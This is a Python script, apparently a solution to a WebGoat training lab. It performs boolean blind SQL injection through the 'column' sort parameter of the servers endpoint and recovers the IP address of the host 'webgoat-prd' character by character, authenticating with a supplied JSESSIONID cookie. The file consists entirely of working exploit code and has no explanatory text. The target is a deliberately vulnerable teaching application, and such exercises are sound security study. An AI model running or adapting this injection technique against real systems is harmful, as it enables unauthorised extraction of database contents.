import requests
import json 
import sys

from requests.exceptions import HTTPError

ip_port = ''
jcookie = ''

def findip(pos,ipc):
 retV = ''
 url = 'http://' + ip_port + '/WebGoat/SqlInjectionMitigations/servers'
 colval = "(CASE WHEN (SELECT substring(ip," + pos + ",1) FROM servers WHERE hostname='webgoat-prd') = '" + ipc  + "' THEN id ELSE description END)"
 # "(case when (false) then hostname else id end)"
 payload = {'column': colval}
 cookie = {'JSESSIONID': jcookie}

 try:
  response = requests.get(url,params=payload,cookies=cookie)
  #print(response.url)

  # If the response was successful, no Exception will be raised
  response.raise_for_status()
 except HTTPError as http_err:
  print(f'HTTP error occurred: {http_err}')  # Python 3.6
 except Exception as err:
  print(f'Other error occurred: {err}')  # Python 3.6
 else:
  #print('Success!')
  jr = json.loads(response.text);
  retV = jr[0]['id']
  #print(response.text)
  return retV

if len(sys.argv) != 3:
 print("You must pass as argument the Webgoat IP:Port and the value of the cookie JSESSIONID. E.g. " + sys.argv[0] + " localhost:8080 r8NBCnqc8reyxx1yPXGDxuT2fHuQ0ffJFsIVh_V4")
 sys.exit()
else:
 ip_port = sys.argv[1]
 jcookie = sys.argv[2]

ip_str = ''

for x in range(16):
 if findip(pos=str(x),ipc='.') == '1':
  ip_str += '.'
 else:
  for y in range(10):
    #if ret. val == 1 True, if == 3 False
   if findip(pos=str(x),ipc=str(y)) == '1':
    ip_str += str(y)
 print(ip_str)
